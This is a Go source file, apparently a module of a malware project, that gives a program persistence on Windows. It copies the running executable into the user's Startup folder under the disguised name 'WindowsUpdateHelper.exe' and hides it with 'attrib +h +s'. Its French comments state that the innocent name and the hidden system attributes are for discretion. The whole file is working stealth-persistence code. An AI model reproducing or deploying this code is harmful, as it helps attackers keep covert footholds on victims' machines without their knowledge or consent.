package startupfolder

import (
	"os"
	"os/exec"
	"path/filepath"

	"github.com/benzoXdev/oxil/utils/fileutil"
)

func Run() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}

	// Chemin du dossier Startup pour l'utilisateur actuel
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	// Nom du fichier (copier avec un nom innocent)
	targetPath := filepath.Join(startupPath, "WindowsUpdateHelper.exe")

	// Créer le dossier Startup s'il n'existe pas
	if !fileutil.Exists(startupPath) {
		err = os.MkdirAll(startupPath, 0755)
		if err != nil {
			return err
		}
	}

	// Supprimer l'ancienne version si elle existe
	if fileutil.Exists(targetPath) {
		err = os.Remove(targetPath)
		if err != nil {
			return err
		}
	}

	// Copier l'exécutable dans le dossier Startup
	err = fileutil.CopyFile(exe, targetPath)
	if err != nil {
		return err
	}

	// Rendre le fichier caché et système (optionnel, pour plus de discrétion)
	exec.Command("attrib", "+h", "+s", targetPath).Run()

	return nil
}
